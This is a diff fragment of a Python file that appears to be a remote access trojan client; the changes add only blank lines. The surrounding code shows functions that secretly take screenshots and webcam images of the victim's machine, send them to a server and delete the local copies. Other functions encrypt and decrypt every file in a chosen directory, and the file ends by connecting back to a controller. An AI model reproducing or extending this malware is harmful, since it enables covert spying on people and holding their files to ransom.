@@ -179,6 +179,7 @@ def get_platform_info():
     return client_platform_info
 
 
+
 #send a screenshot back to server
 def screenshot(conn):
     conn.send('\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())#send current working directory back to server
@@ -200,6 +201,7 @@ def screenshot(conn):
             content = file.read(1024)
     file.close()
     os.remove("img.jpg") #remove image from client machine
+
 
 
 #send webcam image back to server
@@ -224,6 +226,7 @@ def capture_webcam_Image(conn):
             content = file.read(1024)
     file.close()
     os.remove(clientImage) #remove image from client machine
+
 
 
 #encrypt all files in directory provided
@@ -313,6 +316,8 @@ def decrypt_All_Files(conn, key, directory):
     else:
          conn.send("\t [+] Directory or file specified does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
          pass
+
+
 
 
 establish_connection()
